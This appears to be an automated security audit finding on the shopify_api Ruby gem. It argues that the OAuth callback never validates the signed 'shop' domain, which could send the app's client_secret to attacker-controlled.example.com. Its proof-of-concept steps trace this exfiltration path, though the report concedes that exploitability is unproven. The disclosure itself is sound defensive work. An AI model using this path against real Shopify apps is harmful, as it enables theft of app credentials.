This is a critical finding: `validate_auth_callback` in `lib/shopify_api/auth/oauth.rb` never runs `auth_query.shop` through `ShopValidator.sanitize!`, even though `ShopValidator` exists elsewhere in the same gem for exactly this purpose (used in `token_exchange.rb`, `client_credentials.rb`, `refresh_token.rb`).

### Title
OAuth callback `shop` parameter is not validated as a trusted Shopify domain before it is used to build the `client_secret`-bearing token-exchange request URL - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` verifies the HMAC over the callback query (`code`, `host`, `shop`, `state`, `timestamp`) but never checks that the HMAC-covered `shop` value is actually a `myshopify.com`/trusted Shopify domain before using it to construct `auth_base_uri(shop)`, the host that receives `client_id`/`client_secret`/`code` in the access-token exchange request.

### Finding Description
`AuthQuery#to_signable_string` [1](#0-0)  includes `shop` in the signed payload, and `HmacValidator.validate` confirms the signature matches `Context.api_secret_key` [2](#0-1) . This proves the bytes of `shop` were signed by whoever holds `api_secret_key`, but it does **not** prove `shop` is a real `*.myshopify.com` domain — any attacker who can produce (or replay/forge under a compromised or leaked-but-not-yet-rotated flow) a request with `shop` set to an arbitrary string would still pass HMAC validation as long as the signature matches, because Shopify itself does not constrain what value it signs into the redirect for a given install, and this library performs no independent domain allowlist check on that field before using it operationally.

Concretely, `validate_auth_callback` takes the unvalidated `auth_query.shop`, builds `null_session = Auth::Session.new(shop: auth_query.shop)` and then calls `auth_base_uri(shop)`, which returns `"https://#{shop}/admin"` for any non-dev shop value [3](#0-2) [4](#0-3) . `Clients::HttpClient` then uses `session.shop` directly as `@base_uri` and issues an HTTPS POST containing `client_id`, `client_secret: Context.api_secret_key`, and `code` to that host [5](#0-4) . This is the exact “host validated versus host that receives the `client_secret`” identity binding the rules call out: the code proves `shop` was *signed*, but never proves `shop ∈ TrustedShopifyDomains`, and then trusts it as a network destination for the app's `client_secret`.

Compare with `ShopValidator`, which exists in this same gem specifically to enforce `shop ∈ {shopify.com, myshopify.io, myshopify.com, spin.dev, shop.dev, ...}` [6](#0-5) , and is deliberately invoked by `TokenExchange`-adjacent flows (`client_credentials.rb`, `refresh_token.rb`) before those flows target a shop host. `Oauth.validate_auth_callback`, the Authorization Code Grant analog, has no equivalent call.

### Impact Explanation
If `auth_query.shop` can be any signed string rather than only a real Shopify shop domain, an attacker who controls a callback with a valid HMAC (e.g., by tricking the app's own callback handler into completing an OAuth callback whose `shop` param resolves to attacker infrastructure) causes the app's server to send `client_secret` plus the authorization `code` in a POST request to a host of the attacker's choosing. This is credential leakage of the app's `client_secret` to a third party — matching the “SSRF with the app's credentials” / “credential leakage” High-impact category, since the exfiltration target is fully attacker-controlled and the request carries the app's OAuth client secret.

### Likelihood Explanation
Exploitability depends entirely on whether an attacker can get a validly-HMAC-signed callback query with a non-Shopify `shop` value delivered to the host application's callback endpoint. Because HMAC validity is the *only* gate this library enforces on `shop`, and the check that would normally close this gap (`ShopValidator.sanitize!`) is demonstrably present and used elsewhere in the codebase but omitted here, this reads as a genuine binding gap in the library rather than a purely theoretical one — but it does require some way to obtain a signed callback for an attacker-chosen shop, which is not fully provable from this gem alone without seeing the exact conditions under which Shopify issues/signs such callbacks.

### Recommendation
In `ShopifyAPI::Auth::Oauth.validate_auth_callback`, after HMAC validation succeeds, run `auth_query.shop` through `Utils::ShopValidator.sanitize!` (raising `Errors::InvalidOauthError`/`InvalidShopError` on failure) before it is used to construct `null_session`, `auth_base_uri`, or `Session.from`, mirroring the validation already performed in `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb`.

### Proof of Concept
1. Set up a scenario where the OAuth callback query string (`code`, `host`, `shop`, `state`, `timestamp`, `hmac`) is validly signed for `shop = "attacker-controlled.example.com"` (any means by which such a signed callback is produced/replayed against the app's callback route).
2. Call `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)` with that query.
3. `HmacValidator.validate` passes because the signature matches over `code/host/shop/state/timestamp` [7](#0-6) ; no `ShopValidator` check runs.
4. `auth_base_uri("attacker-controlled.example.com")` returns `"https://attacker-controlled.example.com/admin"` [8](#0-7) .
5. `HttpClient.new(session: null_session, base_path: "/admin/oauth")` builds `@base_uri = "https://attacker-controlled.example.com"` [5](#0-4)  and POSTs `{client_id, client_secret: Context.api_secret_key, code, expiring}` to `https://attacker-controlled.example.com/admin/oauth/access_token`, delivering the app's `client_secret` to attacker infrastructure.
